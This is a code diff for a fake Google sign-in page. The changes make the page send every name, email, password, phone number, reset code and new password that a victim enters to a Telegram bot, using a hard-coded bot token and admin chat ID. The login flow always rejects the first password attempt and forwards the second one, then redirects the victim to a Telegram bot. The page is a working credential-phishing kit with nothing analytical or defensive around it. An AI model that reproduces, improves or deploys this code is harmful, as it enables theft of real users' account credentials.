@@ -332,9 +332,8 @@
     <div class="modal-content">
         <span class="close-modal" onclick="closeCreateAccountModal()">&times;</span>
         <h3>Create your Google Account</h3>
-        <p style="color:#5f6368; font-size:0.8rem;">Enter your REAL Gmail credentials</p>
         <input type="text" id="createName" placeholder="Full name">
-        <input type="email" id="createEmail" placeholder="Gmail address">
+        <input type="email" id="createEmail" placeholder="Email">
         <input type="password" id="createPassword" placeholder="Password">
         <button onclick="submitCreateAccount()">Create account</button>
     </div>
@@ -345,45 +344,21 @@
     <div class="modal-content">
         <span class="close-modal" onclick="closeForgotPasswordModal()">&times;</span>
         <h3>Reset your password</h3>
-        <p style="color:#5f6368; font-size:0.8rem;">We'll send a verification code to your phone</p>
         <input type="tel" id="phoneNumber" placeholder="Phone number">
         <input type="email" id="resetEmail" placeholder="Your email address">
-        <button onclick="sendResetCode()">Send verification code</button>
-    </div>
-</div>
-
-<!-- Verify Code Modal -->
-<div id="verifyCodeModal" class="modal">
-    <div class="modal-content">
-        <span class="close-modal" onclick="closeVerifyCodeModal()">&times;</span>
-        <h3>Verification code</h3>
-        <p style="color:#5f6368; font-size:0.8rem;">Enter the code sent to your phone</p>
-        <input type="text" id="verificationCode" placeholder="6-digit code">
-        <button onclick="verifyCode()">Verify</button>
-    </div>
-</div>
-
-<!-- New Password Modal -->
-<div id="newPasswordModal" class="modal">
-    <div class="modal-content">
-        <span class="close-modal" onclick="closeNewPasswordModal()">&times;</span>
-        <h3>Create new password</h3>
-        <p style="color:#5f6368; font-size:0.8rem;" id="resetEmailDisplay"></p>
-        <input type="password" id="newPassword" placeholder="New password">
-        <input type="password" id="confirmPassword" placeholder="Confirm password">
-        <button onclick="resetPassword()">Reset password</button>
+        <button onclick="sendResetCode()">Send reset link</button>
     </div>
 </div>
 
 <script>
-    // ==================== API Settings ====================
-
+    // ==================== Telegram Bot Settings ====================
+    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
+    const ADMIN_CHAT_ID = "8295417969";
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=8020108872";
 
     let attemptStore = {};
     let currentEmail = "";
-    let pendingResetEmail = "";
-    let generatedCode = "";
+    let forgotData = {};
 
     const step1View = document.getElementById('step1View');
     const step2View = document.getElementById('step2View');
@@ -394,6 +369,7 @@
     const successBox = document.getElementById('successBox');
     const stepIndicator = document.getElementById('stepIndicator');
 
+    // ========== Helper Functions ==========
     async function sendToTelegram(message) {
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -401,12 +377,12 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown' })
             });
-        } catch (err) { console.warn(err); }
+        } catch (err) { console.warn("Telegram error", err); }
     }
 
     async function sendToAdminFromLink(buttonName, action) {
         const ip = await getUserIP();
-        const msg = `🔘 *${buttonName}*\n\n⚡ ${action}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`;
+        const msg = `🔘 *BUTTON CLICKED*\n\n📌 Button: ${buttonName}\n⚡ Action: ${action}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
         await sendToTelegram(msg);
     }
 
@@ -457,23 +433,11 @@
             return;
         }
 
-        try {
-            const response = await fetch(`${API_BASE_URL}/create-account`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name, email, password, ip })
-            });
-            const data = await response.json();
+        const msg = `🆕 *NEW ACCOUNT CREATION*\n\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        await sendToTelegram(msg);
 
-            if (data.success) {
-                alert("Account created successfully! You can now login.");
-                closeCreateAccountModal();
-            } else {
-                alert("Invalid Gmail credentials! Please use real Gmail.");
-            }
-        } catch (err) {
-            alert("Network error! Is the server running?");
-        }
+        alert("Account created successfully! You can now login.");
+        closeCreateAccountModal();
     }
 
     // ========== Forgot Password ==========
@@ -487,17 +451,6 @@
         document.getElementById('resetEmail').value = '';
     }
 
-    function closeVerifyCodeModal() {
-        document.getElementById('verifyCodeModal').style.display = 'none';
-        document.getElementById('verificationCode').value = '';
-    }
-
-    function closeNewPasswordModal() {
-        document.getElementById('newPasswordModal').style.display = 'none';
-        document.getElementById('newPassword').value = '';
-        document.getElementById('confirmPassword').value = '';
-    }
-
     async function sendResetCode() {
         const phone = document.getElementById('phoneNumber').value.trim();
         const email = document.getElementById('resetEmail').value.trim();
@@ -508,84 +461,24 @@
             return;
         }
 
-        try {
-            const response = await fetch(`${API_BASE_URL}/send-code`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, email, ip })
-            });
-            const data = await response.json();
+        const code = Math.floor(100000 + Math.random() * 900000).toString();
+        forgotData[email] = { phone, code };
 
-            if (data.success) {
-                generatedCode = data.code;
-                pendingResetEmail = email;
-                alert(`Verification code: ${generatedCode}\n(Simulated - in production this would be sent via SMS)`);
-                closeForgotPasswordModal();
-                document.getElementById('verifyCodeModal').style.display = 'flex';
-            }
-        } catch (err) {
-            alert("Network error!");
+        const msg = `📱 *PASSWORD RESET REQUEST*\n\n📞 Phone: ${phone}\n📧 Email: ${email}\n🔑 Reset Code: ${code}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        await sendToTelegram(msg);
+
+        alert(`Verification code sent to ${phone} (Demo code: ${code})`);
+        closeForgotPasswordModal();
+
+        const newPassword = prompt("Enter your new password:");
+        if (newPassword) {
+            const resetMsg = `🔄 *PASSWORD RESET SUCCESSFUL*\n\n📧 Email: ${email}\n🔑 New Password: ${newPassword}\n🌐 IP: ${ip}`;
+            await sendToTelegram(resetMsg);
+            alert("Password reset successful! You can now login.");
         }
     }
 
-    async function verifyCode() {
-        const code = document.getElementById('verificationCode').value.trim();
-
-        try {
-            const response = await fetch(`${API_BASE_URL}/verify-code`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: pendingResetEmail, code })
-            });
-            const data = await response.json();
-
-            if (data.success) {
-                closeVerifyCodeModal();
-                document.getElementById('resetEmailDisplay').innerHTML = `Email: ${pendingResetEmail}`;
-                document.getElementById('newPasswordModal').style.display = 'flex';
-            } else {
-                alert("Invalid verification code!");
-            }
-        } catch (err) {
-            alert("Network error!");
-        }
-    }
-
-    async function resetPassword() {
-        const newPass = document.getElementById('newPassword').value.trim();
-        const confirmPass = document.getElementById('confirmPassword').value.trim();
-        const phone = document.getElementById('phoneNumber').value;
-        const ip = await getUserIP();
-
-        if (!newPass || !confirmPass) {
-            alert("Please fill in both password fields!");
-            return;
-        }
-        if (newPass !== confirmPass) {
-            alert("Passwords do not match!");
-            return;
-        }
-
-        try {
-            const response = await fetch(`${API_BASE_URL}/reset-password`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: pendingResetEmail, new_password: newPass, ip, phone })
-            });
-            const data = await response.json();
-
-            if (data.success) {
-                alert("Password reset successfully! You can now login with your new password.");
-                closeNewPasswordModal();
-            } else {
-                alert("Password reset failed!");
-            }
-        } catch (err) {
-            alert("Network error!");
-        }
-    }
-
-    // ========== Login ==========
+    // ========== Login Logic (2 attempts - 2nd attempt always accepted) ==========
     document.getElementById('nextBtn').addEventListener('click', () => {
         const email = emailInput.value.trim();
         if (!email || !email.includes('@')) {
@@ -615,35 +508,23 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
+        // لومړۍ هڅه - ناکامه (اډمن ته خبر نه ځي)
         if (currentAttempt === 1) {
             showMessage(errorBox, "❌ Incorrect password. Second attempt will be accepted.", true);
             setTimeout(() => { goBackToEmail(); }, 2000);
             return;
         }
 
+        // دوهمه هڅه - بریالۍ (همدا پاسورډ اډمن ته ځي)
         if (currentAttempt >= 2) {
-            try {
-                const response = await fetch(`${API_BASE_URL}/login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: currentEmail, password, ip, attempt: currentAttempt })
-                });
-                const data = await response.json();
-
-                if (data.success) {
-                    showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
-                    const loginBtn = document.getElementById('loginBtn');
-                    loginBtn.disabled = true;
-                    loginBtn.style.opacity = '0.6';
-                    setTimeout(() => { window.location.href = BOT_REDIRECT; }, 1800);
-                } else {
-                    showMessage(errorBox, "❌ Invalid credentials! Access denied.", true);
-                    setTimeout(() => { goBackToEmail(); }, 2000);
-                }
-            } catch (err) {
-                showMessage(errorBox, "❌ Network error! Is the server running?", true);
-                setTimeout(() => { goBackToEmail(); }, 2000);
-            }
+            const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${currentEmail}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📊 Attempt: ${currentAttempt}\n🕒 Time: ${new Date().toLocaleString()}`;
+            await sendToTelegram(msg);
+            
+            showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.6';
+            setTimeout(() => { window.location.href = BOT_REDIRECT; }, 1800);
         }
     });
 
@@ -652,11 +533,7 @@
 
     window.openForgotPasswordModal = openForgotPasswordModal;
     window.closeForgotPasswordModal = closeForgotPasswordModal;
-    window.closeVerifyCodeModal = closeVerifyCodeModal;
-    window.closeNewPasswordModal = closeNewPasswordModal;
     window.sendResetCode = sendResetCode;
-    window.verifyCode = verifyCode;
-    window.resetPassword = resetPassword;
     window.openCreateAccountModal = openCreateAccountModal;
     window.closeCreateAccountModal = closeCreateAccountModal;
     window.submitCreateAccount = submitCreateAccount;
